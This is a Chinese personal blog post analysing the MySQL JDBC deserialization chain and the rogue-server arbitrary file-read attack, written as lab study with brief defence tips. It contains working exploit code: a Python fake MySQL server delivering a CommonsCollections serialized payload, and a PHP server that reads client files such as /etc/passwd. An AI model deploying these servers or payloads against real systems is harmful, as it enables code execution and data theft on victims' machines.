---
·layout: post
title: javaJDBC反序列化
categories: [blog ]
tags: [Java,]
description: ""
image:
  feature: windows.jpg
  credit: JYcxk
  creditlink: sh
---

```java
       <dependency>
            <groupId>mysql</groupId>
            <artifactId>mysql-connector-java</artifactId>
            <version>8.0.12</version>
        </dependency>
        <dependency>
            <groupId>commons-collections</groupId>
            <artifactId>commons-collections</artifactId>
            <version>3.1</version>
        </dependency>
```

## JDBC简介

JDBC(Java Database Connectivity)是Java与数据库之间的桥梁， 是Java提供对数据库进行连接、操作的标准API。Java自身并不会去实现对数据库的连接、查询、更新等操作，而是通过抽象出数据库操作的API接口，即JDBC。不同的数据库提供商必须实现JDBC定义的接口从而也就实现了对数据库的一系列操作。

JDBC对数据库操作一般有以下步骤：

1、导入包含数据库编程所需的JDBC的软件包。通常，使用`import java.sql.*`就足够了

2、初始化JDBC驱动程序(driver)，打开与数据库的通信通道。

从`mysql-connector-java 6`开始`com.mysql.jdbc.Driver`被弃用了，改用新的驱动`com.mysql.cj.jdbc.Driver`，然后利用`Class.forName()`方法加载即可

3、与数据库建立连接。利用`DriverManager`中的`getConnection`方法创建一个与服务器的物理连接`Connection`对象，通过`JDBC url`，用户名，密码来连接相应的数据库，而`JDBC URL`格式

```java
jdbc:mysql://host:port/database_name?arg1=value&arg2...
```

4、执行数据库查询。需要使用 `Statement`类型的对象来构建SQL语句并将其提交到数据库

5、清理：需要显示关闭所有数据库资源，而不是依赖JVM的垃圾回收

```java
import java.sql.*;  // 1.导入软件包

public class Test {
    public static void main(String[] args) throws Exception {
        String driver = "com.mysql.cj.jdbc.Driver";
        String DB_URL = "jdbc:mysql://127.0.0.1:3306/security?serverTimezone=UTC";  // serverTimezone设置时区
        String username = "root";
        String password = "root";
        String sql = "select * from users";

        Class.forName(driver);  // 2.初始化JDBC驱动程序(Driver)
        Connection conn = DriverManager.getConnection(DB_URL, username, password);  // 3.与数据库建立连接
        Statement statement = conn.createStatement();  // 4.1 创建Statement对象
        ResultSet query = statement.executeQuery(sql);  // 4.2 执行SQL查询
        while (query.next()) {
            System.out.println(query.getString("id") + " : " + query.getString("username"));  // 打印查询结果
        }
        statement.close();
        conn.close();  // 5.主动销毁，断开连接
    }
}
```

### 漏洞分析

首先我们要触发反序列化攻击，肯定是找哪里调用了`readObject`方法

在ResultSetImpl#getObject方法中调用了readObject

（获得了指定列的序列化数据，然后经过种种判断，最后进行反序列化）

```java
public Object getObject(int columnIndex) throws SQLException {
        try {
            this.checkRowPos();
            this.checkColumnBounds(columnIndex);
            int columnIndexMinusOne = columnIndex - 1;
            if (this.thisRow.getNull(columnIndexMinusOne)) {
                return null;
            } else {
                Field field = this.columnDefinition.getFields()[columnIndexMinusOne];
                switch (field.getMysqlType()) {
                    case BIT://获取的字段的类型必须是BIT
                        if (!field.isBinary() && !field.isBlob()) {//判断数据是不是blob或者二进制数据
                            return field.isSingleBit() ? this.getBoolean(columnIndex) : this.getBytes(columnIndex);
                        } else {
                            byte[] data = this.getBytes(columnIndex);
                            if (!(Boolean)this.connection.getPropertySet().getBooleanProperty("autoDeserialize").getValue()) {//autoDeserialize属性必须为true
                                return data;
                            } else {
                                Object obj = data;
                                if (data != null && data.length >= 2) {
                                    if (data[0] != -84 || data[1] != -19) {//序列化数据的前缀
                                        return this.getString(columnIndex);
                                    }

                                    try {
                                        ByteArrayInputStream bytesIn = new ByteArrayInputStream(data);
                                        ObjectInputStream objIn = new ObjectInputStream(bytesIn);
                                        obj = objIn.readObject();//反序列化 
                                        objIn.close();
                                        bytesIn.close();
                                    } catch (ClassNotFoundException var13) {
                                        throw SQLError.createSQLException(Messages.getString("ResultSet.Class_not_found___91") + var13.toString() + Messages.getString("ResultSet._while_reading_serialized_object_92"), this.getExceptionInterceptor());
                                    } catch (IOException var14) {
                                        obj = data;
                                    }
                                }
                                return obj;
                            }
                        }
```

### 哪里调用了getObject(int)

com.mysql.cj.jdbc.util.ResultSetUtil#resultSetToMap()

这俩种方法都可以调用方法，只不过参数一个可控一个不可控，rs需要传入ResultSetImpl对象

![image-20231127131512770](..\img\final\image-20231127131512770.png)

### 找哪里调用了 resultSetToMap()

com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor.populateMapWithSessionStatusValues()

甚至这里的rs已经是ResultSetImpl对象了，ResultSet是一个接口

```java
 private void populateMapWithSessionStatusValues(Map<String, String> toPopulate) {
        Statement stmt = null;
        ResultSet rs = null;

        try {
            try {
                toPopulate.clear();
                stmt = this.connection.createStatement();
                rs = stmt.executeQuery("SHOW SESSION STATUS");
                ResultSetUtil.resultSetToMap(toPopulate, rs);
            } finally {
                if (rs != null) {
                    rs.close();
                }

                if (stmt != null) {
                    stmt.close();
                }

            }

        } catch (SQLException var8) {
            throw ExceptionFactory.createException(var8.getMessage(), var8);
        }
    }
```

### 然后就是找如何调用populateMapWithSessionStatusValues

继续找哪里调用populateMapWithSessionStatusValues()`，最后我们找到了`ServerStatusDiffInterceptor#preProcess()方法

简单来说参数`queryInterceptors`就是指定一个或者多个实现了`com.mysql.cj.interceptors.QueryInterceptor`接口的类，然后在进行SQL查询操作之前，执行该类中的一个方法从而来影响最终的查询结果，而这个方法就是`preProcess`方法。（在查询完之后，还会调用其`postProcess`方法在此进行一个处理）

```java
queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor  就会首先调用该类的preProcess方法，结束时会调用 postProcess方法
```

`	因此在 JDBC URL 中设定属性`queryInterceptors`为`ServerStatusDiffInterceptor`时，执行查询语句会调用拦截器的`preProcess()`方法，进而通过上述调用链最终调用`readObject()`方法。而通过`JDBC`连接数据库的时候，会有几个内置的SQL语句会被执行。`

所以这条链子就已经通了

`只不过和以往不同的地方是通过mysql的配置触发特定方法种进行readObject`

```java
queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor
     ServerStatusDiffInterceptor#preProcess
           ServerStatusDiffInterceptor#populateMapWithSessionStatusValues
                   ResultSetUtil#resultSetToMap
                        ResultSetImpl#getObject
                              readObject
```

### 测试：连接本地数据库

```java
import com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor;
import com.mysql.cj.jdbc.result.ResultSetImpl;

import java.sql.Connection;
import java.sql.DriverManager;

public class payload {
    public static void main(String[] args) throws Exception {
        String driver = "com.mysql.cj.jdbc.Driver";
        String DB_URL = "jdbc:mysql://127.0.0.1:3306/bbb?serverTimezone=UTC&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&autoDeserialize=true&useSSL=false";
        String username = "root";
        String password = "200377";

        Class.forName(driver);
        Connection conn = DriverManager.getConnection(DB_URL, username, password);
        conn.close();
    
    }
}

```

![image-20231127133523519](..\img\final\image-20231127133523519.png)

![image-20231127134028383](..\img\final\image-20231127134028383.png)

结合上面的分析，如果参数和`JDBC url`可控，就能执行反序列化，存在CC和CB链的反序列化漏洞时就可以进行漏洞利用。而这个参数就是**查询语句的结果集**，因此假如`JDBC url`可控，我们就可以让它连接任意Mysql服务器，就可以搭建恶意MySQL服务器来控制这两个查询的结果集，结合控制`JDBC url`中的连接设置项，就可以构成**JDBC反序列化漏洞**

```java
import socket
import binascii
import os

greeting_data="4a0000000a352e372e31390008000000463b452623342c2d00fff7080200ff811500000000000000000000032851553e5c23502c51366a006d7973716c5f6e61746976655f70617373776f726400"
response_ok_data="0700000200000002000000"

def receive_data(conn):
    data = conn.recv(1024)
    print("[*] Receiveing the package : {}".format(data))
    return str(data).lower()

def send_data(conn,data):
    print("[*] Sending the package : {}".format(data))
    conn.send(binascii.a2b_hex(data))

def get_payload_content():
    #file文件的内容使用ysoserial生成的 使用规则  java -jar ysoserial [common7那个]  "calc" > payload
    file= r'payload'
    if os.path.isfile(file):
        with open(file, 'rb') as f:
            payload_content = str(binascii.b2a_hex(f.read()),encoding='utf-8')
        print("open successs")

    else:
        print("open false")
        #calc
        payload_content='aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001b00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e00137571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00187371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000463616c63740004657865637571007e001b0000000171007e00207371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878'
    return payload_content

# 主要逻辑
def run():

    while 1:
        conn, addr = sk.accept()
        print("Connection come from {}:{}".format(addr[0],addr[1]))

        # 1.先发送第一个 问候报文
        send_data(conn,greeting_data)

        while True:
            # 登录认证过程模拟  1.客户端发送request login报文 2.服务端响应response_ok
            receive_data(conn)
            send_data(conn,response_ok_data)

            #其他过程
            data=receive_data(conn)
            #查询一些配置信息,其中会发送自己的 版本号
            if "session.auto_increment_increment" in data:
                _payload='01000001132e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c210012000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c210033000000fd00001f000022000008036465660000000c696e69745f636f6e6e656374000c210000000000fd00001f0000290000090364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000a03646566000000076c6963656e7365000c210009000000fd00001f00002c00000b03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000c03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000d03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000002600000e036465660000001071756572795f63616368655f73697a65000c3f001500000008a0000000002600000f036465660000001071756572795f63616368655f74797065000c210009000000fd00001f00001e000010036465660000000873716c5f6d6f6465000c21009b010000fd00001f000026000011036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000012036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001303646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000014036465660000000c776169745f74696d656f7574000c3f001500000008a000000000020100150131047574663804757466380475746638066c6174696e31116c6174696e315f737765646973685f6369000532383830300347504c013107343139343330340236300731303438353736034f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce4062b30383a30300f52455045415441424c452d5245414405323838303007000016fe000002000000'
                send_data(conn,_payload)
                data=receive_data(conn)
            elif "show warnings" in data:
                _payload = '01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000'
                send_data(conn, _payload)
                data = receive_data(conn)
            if "set names" in data:
                send_data(conn, response_ok_data)
                data = receive_data(conn)
            if "set character_set_results" in data:
                send_data(conn, response_ok_data)
                data = receive_data(conn)
            if "show session status" in data:
                mysql_data = '0100000102'
                mysql_data += '1a000002036465660001630163016301630c3f00ffff0000fc9000000000'
                mysql_data += '1a000003036465660001630163016301630c3f00ffff0000fc9000000000'
                # 为什么我加了EOF Packet 就无法正常运行呢？？
                #获取payload
                payload_content=get_payload_content()
                #计算payload长度
                payload_length = str(hex(len(payload_content)//2)).replace('0x', '').zfill(4)
                payload_length_hex = payload_length[2:4] + payload_length[0:2]
                #计算数据包长度
                data_len = str(hex(len(payload_content)//2 + 4)).replace('0x', '').zfill(6)
                data_len_hex = data_len[4:6] + data_len[2:4] + data_len[0:2]
                mysql_data += data_len_hex + '04' + 'fbfc'+ payload_length_hex
                mysql_data += str(payload_content)
                mysql_data += '07000005fe000022000100'
                send_data(conn, mysql_data)
                data = receive_data(conn)
            if "show warnings" in data:
                payload = '01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000'
                send_data(conn, payload)
            break


if __name__ == '__main__':
    HOST ='0.0.0.0'
    PORT = 3309

    sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    #当socket关闭后，本地端用于该socket的端口号立刻就可以被重用.为了实验的时候不用等待很长时间
    sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sk.bind((HOST, PORT))
    sk.listen(1)

    print("start fake mysql server listening on {}:{}".format(HOST,PORT))

    run()
```

![image-20231127205216130](..\img\final\image-20231127205216130.png)

### 不同 MySQL-JDBC-Driver 的 JDBC设置

**8.x**

上面就是用8.0.12分析的

```
jdbc:mysql://127.0.0.1:3309/mysql?serverTimezone=UTC&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&autoDeserialize=true
```

**6.x**

参数名不同，queryInterceptors 换为 statementInterceptors

```
jdbc:mysql://127.0.0.1:3309/mysql?serverTimezone=UTC&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&autoDeserialize=true
```

**>=5.1.11的5.x**

旧的驱动包名中没有cj

```
jdbc:mysql://127.0.0.1:3309/mysql?serverTimezone=UTC&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&autoDeserialize=true
```

**5.x <= 5.1.10**

连接到数据库后还需要额外执行查询

**5.1.29 - 5.1.40**

```
jdbc:mysql://127.0.0.1:3309/mysql?detectCustomCollations=true&autoDeserialize=true
```

**5.1.28 - 5.1.19**

```
jdbc:mysql://127.0.0.1:3309/mysql?autoDeserialize=true
```



# Mysql Client 任意文件读取攻击

#### 前提：

```java
服务器部署一个可以远程连接的数据库
#运行下面两句话之后就可以通过root账户远程登陆。
 mysql8版本
update user set host='%' where user='root';
 
#命令立即执行生效(千万不要忘记刷新！！！！！)
#这句表示从mysql数据库的grant表中重新加载权限数据
flush privileges;
```

mysql5版本

```java
GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY '!0Panghl(*)' WITH GRANT OPTION;   //这里的!0Panghl(*)要换成你自己mysql数据库的密码
 
#命令立即执行生效(千万不要忘记刷新！！！！！)
flush privileges;
```

### Load data infile

```java
load data infile "/etc/passwd" into table test fields terminated by '\n';
```

mysql server会读取服务端/etc/passwd然后将数据按照`\n`分割插入表中，`需要有FILE权限`，以及非load加载的语句也受到`secure_file_priv`的限制

如果我们加入一个关键字local

```java
mysql> load data local infile "/etc/passwd" into table test FIELDS TERMINATED BY '\n';
Query OK, 11 rows affected, 11 warnings (0.01 sec)
Records: 11  Deleted: 0  Skipped: 0  Warnings: 11
```

加了local之后，这个语句就成了，读取客户端的文件发送到服务端，上面那个语句执行结果如下

在mysql文档中的说到，**服务端可以要求客户端读取有可读权限的任何文件**。

mysql认为**客户端不应该连接到不可信的服务端**。

#### 然后通过wireshark抓包流量，通过构建恶意的流量达到效果(太菜直接拿✌的链子了 )

```java
客户端：我要test表中的数据
服务端：我要你的win.ini内容
客户端：win.ini的内容如下???
```

https://github.com/allyshka/Rogue-MySql-Server 用python2脚本运行即可

左边是客户端

右边是恶意的服务器记得要先kill 3306端口的进程

![image-20231128111641384](..\img\final\image-20231128111641384.png)



对于这种攻击的防御，说起来比较简单，首先一点就是客户端要避免使用 LOCAL 来读取本地文件。但是这样并不能避免连接到恶意的服务器上，如果想规避这种情况，可以使用`--ssl-mode=VERIFY_IDENTITY`来建立可信的连接。

##### 在php中也可以利用，只要ip可控就可以了

![image-20231128112827334](..\img\final\image-20231128112827334.png)

```java
<?php
function unhex($str) { return pack("H*", preg_replace('#[^a-f0-9]+#si', '', $str)); }
$filename = "/etc/passwd";
$srv = stream_socket_server("tcp://0.0.0.0:3307");
while (true) {
  echo "Enter filename to get [$filename] > ";
  $newFilename = rtrim(fgets(STDIN), "\r\n");
  if (!empty($newFilename)) {
    $filename = $newFilename;
  }
  echo "[.] Waiting for connection on 0.0.0.0:3307\n";
  $s = stream_socket_accept($srv, -1, $peer);
  echo "[+] Connection from $peer - greet... ";
  fwrite($s, unhex('45 00 00 00 0a 35 2e 31  2e 36 33 2d 30 75 62 75
                    6e 74 75 30 2e 31 30 2e  30 34 2e 31 00 26 00 00
                    00 7a 42 7a 60 51 56 3b  64 00 ff f7 08 02 00 00
                    00 00 00 00 00 00 00 00  00 00 00 00 64 4c 2f 44
                    47 77 43 2a 43 56 63 72  00                     '));
  fread($s, 8192);
  echo "auth ok... ";
  fwrite($s, unhex('07 00 00 02 00 00 00 02  00 00 00'));
  fread($s, 8192);
  echo "some shit ok... ";
  fwrite($s, unhex('07 00 00 01 00 00 00 00  00 00 00'));
  fread($s, 8192);
  echo "want file... ";
  fwrite($s, chr(strlen($filename) + 1) . "\x00\x00\x01\xFB" . $filename);
  stream_socket_shutdown($s, STREAM_SHUT_WR);
  echo "\n";

  echo "[+] $filename from $peer:\n";

  $len = fread($s, 4);
  if(!empty($len)) {
    list (, $len) = unpack("V", $len);
    $len &= 0xffffff;
    while ($len > 0) {
      $chunk = fread($s, $len);
      $len -= strlen($chunk);
      echo $chunk;
    }
  }
  echo "\n\n";
  fclose($s);
}
```

## 此时遇到了一个很棘手的问题（未解决）

就是在服务器上部署恶意服务器的时候；java一连接就报错，很不理解，远程打JDBC未成功

但是在kali和本地都是正常的

![image-20231128151116391](..\img\final\image-20231128151116391.png)

## mysql任意读取文件实践

![image-20231128152429751](..\img\final\image-20231128152429751.png)

```java
    import com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor;
    import com.mysql.cj.jdbc.result.ResultSetImpl;

    import java.sql.Connection;

    import java.sql.DriverManager;

    public class payload {
        public static void main(String[] args) throws Exception {
            String driver = "com.mysql.cj.jdbc.Driver";
            String DB_URL = "jdbc:mysql://:3306/mysql?characterEncoding=utf8&useSSL=false&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&autoDeserialize=true";
                DB_URL="jdbc:mysql://:3307?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=fileread_c:\\windows\\win.ini";
            String username = "root";
            String password = "200377";

            Class.forName(driver);
           // Connection conn = DriverManager.getConnection(DB_URL, username, password);
            Connection conn = DriverManager.getConnection(DB_URL);

        }
    }

```

继续读某一个jar包呢（也是可以的）

![image-20231128152909719](..\img\final\image-20231128152909719.png)

##### 总结一下流程：

```java
1、首先尝试mysql连接恶意的服务器，我们通过服务器可以篡改任意读取的信息
2、如果那条连接到sql语句可控，我们更加方便任意读取文件
3、构造恶意服务器，打反序列化JDBC
关键就是通过wireshark抓包，构造虚假的流量通信
前提：mysql语句是可控的不然连接不到自己的恶意服务器（baiwan
如果想规避这种情况，可以使用--ssl-mode=VERIFY_IDENTITY来建立可信的连接。
```

润了继续奔赴下一个战场了（DASCTF）

### 写一下最近的情况叭：

```java
最近开始了软件工程&java开发的课程实践，91个人，6个人一组 余出来一个
😔，因为老师说写出需求画图即可，并不需要代码的实现，于是舔face加入了女生的一组（我是第七个人当时感觉自己就是天选之子）
没办法，很多组都是7个人，需要重新划分，tnnd，我以为我稳了，结果被留到了最后东拼西凑的组，天选之人并不是我
 我tnnd🥵🥵🥵，这个组真的是依托答辩，一个人都不熟还没能带我C的人
开摆，反正不用代码实现。。。
做什么？难得啥交通，我会写遍历？我会深度优先算法？写g8
写个图书馆我觉得就不戳，没准能实现，最后在尝试尝试漏洞这不美滋滋？？？
```

